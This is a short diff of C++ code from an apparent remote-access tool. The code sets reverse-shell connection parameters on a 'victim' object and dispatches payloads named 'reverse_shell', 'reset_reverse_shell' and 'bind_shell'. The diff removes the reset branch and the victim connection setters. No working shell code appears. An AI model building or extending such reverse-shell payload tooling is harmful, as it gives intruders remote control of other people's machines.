@@ -67,14 +67,9 @@ bool PayloadFactory::temReverseShell(){
     return true;
 }
 
-bool PayloadFactory::setIP_Port(const std::string &rsIP,uint rsPort){
+void PayloadFactory::setIP_Port(const std::string &rsIP,uint rsPort){
     this->rsIP = rsIP;
     this->rsPortNo = rsPort;
-    
-    victim->setConnectIP(rsIP.c_str());
-    victim->setConnectPortNo(rsPort);
-
-    return true;
 }
 
 
@@ -82,10 +77,6 @@ bool PayloadFactory::createPayloadRuntime(const std::string payload_name ,std::v
     if(payload_name == "reverse_shell"){
         DEBUG("1");
         return temReverseShell();
-    }
-    if(payload_name == "reset_reverse_shell"){
-        if(args.size() != 2) return false;
-        return reSetReverseShell(args[0],std::stoi(args[1]));
     }
     else if(payload_name == "bind_shell"){
         return false;
